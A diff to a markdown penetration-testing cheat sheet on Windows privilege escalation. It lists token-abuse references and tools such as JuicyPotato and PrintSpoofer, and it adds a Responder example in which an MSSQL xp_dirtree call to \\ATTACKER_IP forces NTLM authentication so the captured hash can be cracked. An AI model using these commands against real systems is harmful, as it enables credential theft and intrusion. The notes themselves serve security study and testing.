@@ -229,16 +229,27 @@ D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLO
  - [Primary Tokens & Impersonation Token](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens#types-of-tokens): 4 levels
  - [Another good ref](https://www.elastic.co/blog/introduction-to-windows-tokens-for-security-practitioners)
  - [Abusing Token Privileges For LPE](https://raw.githubusercontent.com/hatRiot/token-priv/refs/heads/master/abusing_token_eop_1.0.txt)
+
 ## Tools
 
-#### SysInternals
+### Using responder
+
+Example with mssql:
+
+    sudo responder -I tun0 -v                                              
+    mssqlclient.py login:password@IP
+    SQL (PublicUser  guest@master)> xp_dirtree \\ATTACKER_IP\\test
+
+Use the hash to crack password
+
+### SysInternals
 
  - Process Explorer
  - ProcDump
  - [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk): list accesses specific users or groups have to resources including files, directories, Registry keys, global objects and Windows services.
  - PsService: View security info of a service `PsService.exe security <service name>`
 
-#### Others
+### Others
 
  - [JuicyPotato](https://github.com/ohpe/juicy-potato): If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM. Doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.
  - [PrintSpoof](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) Windows 10 and Server 2019
